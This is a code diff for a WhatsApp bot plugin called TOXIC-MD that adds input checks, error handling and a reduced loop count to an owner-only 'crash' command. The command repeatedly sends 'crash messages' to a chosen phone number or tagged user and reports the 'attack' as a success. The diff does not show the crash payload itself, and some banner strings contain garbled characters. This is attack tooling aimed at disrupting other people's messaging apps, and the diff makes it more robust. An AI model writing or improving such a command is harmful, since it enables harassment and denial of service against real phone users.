@@ -12,7 +12,7 @@ const normalizeNumber = (number) => {
 // Sleep function for delay
 const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
-// Malicious message function (adapted from fc2)
+// Malicious message function
 async function sendCrashMessage(zk, target) {
   console.log(`[DEBUG] Sending crash message to ${target}`);
 
@@ -121,20 +121,25 @@ zokou({ nomCom: "crash", categorie: "Owner", reaction: "☠️" }, async (dest, 
 
   if (!isOwner) {
     console.log(`[DEBUG] crash: User is not the owner`);
-    repondre(`𝐓𝐎𝐗𝐈𝐂-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ YOU VILE IMPOSTOR! 😤 Trying to wield ${OWNER_NUMBER}’s destructive power? You’re LESS THAN DUST! Begone! 🚫\n◈━━━━━━━━━━━━━━━━◈`);
+    await repondre(`𝐓𝐎𝐗𝐈𝐂-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ YOU VILE IMPOSTOR! 😤 Trying to wield ${OWNER_NUMBER}’s destructive power? You’re LESS THAN DUST! Begone! 🚫\n◈━━━━━━━━━━━━━━━━◈`);
     return;
   }
 
   // Validate input
   if (!arg[0]) {
     console.log(`[DEBUG] crash: No target provided`);
-    repondre(`𝐓𝐎𝐗𝐈C-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ YOU FOOL, ${userName}! 😡 Provide a target number! Format: .crash 254xxx\n◈━━━━━━━━━━━━━━━━◈`);
+    await repondre(`𝐓𝐎𝐗𝐈𝐂-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ YOU FOOL, ${userName}! 😡 Provide a target number! Format: .crash 254xxx\n◈━━━━━━━━━━━━━━━━◈`);
     return;
   }
 
-  // Extract target
+  // Extract and validate target
   let client = ms.mentionedJid[0] ? ms.mentionedJid[0] : ms.quoted ? ms.quoted.sender : arg[0].replace(/[^0-9]/g, '');
-  const isTarget = client + "@s.whatsapp.net";
+  if (!client) {
+    console.log(`[DEBUG] crash: Invalid target provided`);
+    await repondre(`𝐓𝐎𝐗𝐈𝐂-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ IDIOT, ${userName}! 😤 Invalid target number! Use: .crash 254xxx or tag/quote a user! 🚫\n◈━━━━━━━━━━━━━━━━◈`);
+    return;
+  }
+  const isTarget = client.includes('@s.whatsapp.net') ? client : `${client}@s.whatsapp.net`;
   console.log(`[DEBUG] crash: Target set to ${isTarget}`);
 
   // Send processing reaction
@@ -147,23 +152,32 @@ zokou({ nomCom: "crash", categorie: "Owner", reaction: "☠️" }, async (dest, 
 
   // Send crash messages
   try {
-    for (let r = 0; r < 50; r++) {
-      await sendCrashMessage(zk, isTarget);
-      await sleep(5000); // 5-second delay
-      await sendCrashMessage(zk, isTarget);
-      console.log(`[DEBUG] crash: Iteration ${r + 1}/50 completed`);
+    for (let r = 0; r < 5; r++) {
+      try {
+        await sendCrashMessage(zk, isTarget);
+        await sleep(5000); // 5-second delay
+        await sendCrashMessage(zk, isTarget);
+        console.log(`[DEBUG] crash: Iteration ${r + 1}/5 completed`);
+      } catch (e) {
+        console.log(`[DEBUG] crash: Error in iteration ${r + 1}: ${e.message}`);
+        throw new Error(`Failed at iteration ${r + 1}: ${e.message}`);
+      }
     }
 
     // Send success reaction
-    await zk.sendMessage(dest, { react: { text: '✅', key: ms.key } });
-    console.log(`[DEBUG] crash: Success reaction sent`);
+    try {
+      await zk.sendMessage(dest, { react: { text: '✅', key: ms.key } });
+      console.log(`[DEBUG] crash: Success reaction sent`);
+    } catch (e) {
+      console.log(`[DEBUG] crash: Error sending success reaction: ${e.message}`);
+    }
 
     // Send success message
-    const successMessage = `𝐓O𝐗𝐈𝐂-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ *Information Attack*\n│❒ Target: ${client}\n│❒ Status: Success\n│❒ Powered by xh_clinton\n◈━━━━━━━━━━━━━━━━◈`;
-    repondre(successMessage);
+    const successMessage = `𝐓𝐎𝐗𝐈𝐂-�{M𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ *Information Attack*\n│❒ Target: ${client.split('@')[0]}\n│❒ Status: Success\n│❒ Powered by xh_clinton\n◈━━━━━━━━━━━━━━━━◈`;
+    await repondre(successMessage);
     console.log(`[DEBUG] crash: Success message sent`);
   } catch (e) {
     console.log(`[DEBUG] crash: Error during attack: ${e.message}`);
-    repondre(`𝐓�{O𝐗𝐈�{C-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ OUTRAGEOUS, ${userName}! 😤 Attack on ${client} failed: ${e.message}! This system will PAY for its incompetence! 🚫\n◈━━━━━━━━━━━━━━━━◈`);
+    await repondre(`𝐓𝐎𝐗𝐈𝐂-�{M𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ OUTRAGEOUS, ${userName}! 😤 Attack on ${client.split('@')[0]} failed: ${e.message}! This system will PAY for its incompetence! 🚫\n◈━━━━━━━━━━━━━━━━◈`);
   }
 });
